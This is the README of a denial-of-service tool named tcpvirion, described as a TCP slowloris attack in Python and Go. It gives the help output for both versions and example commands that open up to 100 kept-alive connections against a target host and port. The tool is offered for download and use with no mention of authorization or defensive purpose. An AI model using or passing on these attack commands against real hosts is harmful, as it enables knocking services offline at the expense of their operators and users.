# tcpvirion
TCP slowloris attack

This simple tool will generate N tcp connections and will keep them alive
by sending keepalive signals<br>
It comes in 2 languages python and golang , choose whats best for you <br>
both are multi platform langs . in both cases , just download a simple file and run

## Using the python version :
````bash
usage: tcpvirion.py [-h] [-t TOTAL] [-p PULSE] [-d DELAY] [-i interval] [--target TARGET] [--port PORT]

optional arguments:
  -h, --help            show this help message and exit
  -t TOTAL, --total TOTAL
                        Total concurrent TCP sessions
  -p PULSE, --pulse PULSE
                        Number of connections per pulse
  -d DELAY, --delay DELAY
                        Number of seconds betweek pulse
  -i INTERVAL, --interval INTERVAL
                        Keepalive interval , default 57s
  --target TARGET       Target host
  --port PORT           Target port
````
Example use :
>./tcpvirion.py --target 192.168.0.1 --port 80 -t 100 -p 10 -d 5 
<p>

## Using the golang version :
 
 ````bash
Usage of ./tcpvirion:
  -delay int
    	The keepalive delay in seconds (default 57)
  -interval int
    	Interval between pulse (default 2)
  -port int
    	Target port number (default 80)
  -pulse int
    	Number of sessions per pulse (default 10)
  -target string
    	Target address FQDN/IP
  -total int
    	Total TCP sessions (default 10)
  ````
Example command : 
>./tcpvirion --target 192.168.0.1 --port 80 --pulse 2 --total 100 --delay 2 --interval 2

* Use on you own risk, this tool has no warrenty 


